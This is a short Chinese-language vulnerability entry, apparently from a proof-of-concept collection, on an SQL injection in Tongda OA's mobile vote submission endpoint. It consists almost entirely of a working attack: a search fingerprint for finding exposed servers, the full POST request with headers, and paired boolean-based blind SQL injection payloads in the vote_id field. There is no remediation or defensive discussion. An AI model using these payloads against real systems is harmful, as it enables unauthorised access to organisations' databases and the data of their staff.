# 通达OAqyapp.vote.submit.php存在SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="TDXK-通达OA"`
- **请求**：`POST /mobile/api/qyapp.vote.submit.php HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=b9nr8to114e4o0j2hqcva9kul3`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 91`

**请求体 / payload**
```
submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}
POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
Host:
Cookie: PHPSESSID=b9nr8to114e4o0j2hqcva9kul3
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
submitData={"a":{"vote_type":"1","vote_id":"if((select 995=99511),1,2*1e308)","value":"1"}}
```
- **预期**：200　|　—